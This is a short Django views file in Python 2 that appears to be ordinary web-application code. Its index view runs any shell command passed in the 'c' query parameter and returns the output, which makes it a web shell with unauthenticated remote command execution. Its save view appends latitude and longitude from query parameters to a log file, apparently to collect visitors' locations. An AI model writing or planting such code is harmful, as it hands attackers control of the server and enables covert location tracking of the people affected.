from django.shortcuts import render
from django.http import HttpResponse
import os,sys,commands,urllib

def index(request):
    s = None
    try:
        s = str(request.GET['c'])
        return HttpResponse(commands.getoutput(s))
    except Exception:
        pass
    return HttpResponse('')
def save(request):
    lat = request.GET['lat']
    lng = request.GET['lng']
    f = open('log.txt','a+')
    f.write('Latitude: '+lat+'\n')
    f.write('Longitude: '+lng+'\n')
    f.close()
    return HttpResponse("$")
